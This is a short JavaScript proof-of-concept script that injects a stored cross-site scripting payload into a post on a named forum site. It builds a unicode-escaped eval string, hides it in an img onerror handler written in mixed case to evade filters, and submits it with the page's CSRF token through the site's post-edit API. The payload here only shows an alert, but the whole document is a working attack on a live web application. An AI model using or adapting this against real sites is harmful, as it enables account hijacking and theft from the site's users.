let code = `alert(6)`;
let result = "";
for (let i = 0; i < code.length; i++) {
  const c = code.charCodeAt(i);
  result += "\\u" + c.toString(16).padStart(4, "0");
}
let content = `<img style="display:none" oNeRrOr="eval('${result}')" src="x">`;
let csrf_token = document.querySelector('meta[name="csrf-token"]')?.content;
let body = [
  "id=452",
  "forum_id=1",
  "post_type=normal",
  "title=神秘",
  "poll_opt[]=",
  "tags=",
  "content=" + encodeURIComponent(content),
  "visibility=all",
  "comment_permission=all",
  "is_anonymous=0",
  "csrf_token=" + csrf_token,
].join("&");
await fetch("https://bbs.adouwork.site/api/post.php?action=edit", {
  headers: {
    accept: "*/*",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "content-type": "application/x-www-form-urlencoded",
    priority: "u=1, i",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0",
    "x-csrf-token": csrf_token,
    "x-requested-with": "XMLHttpRequest",
  },
  referrer: "https://bbs.adouwork.site/pages/post_edit.php?id=452",
  body,
  method: "POST",
  mode: "cors",
  credentials: "include",
});
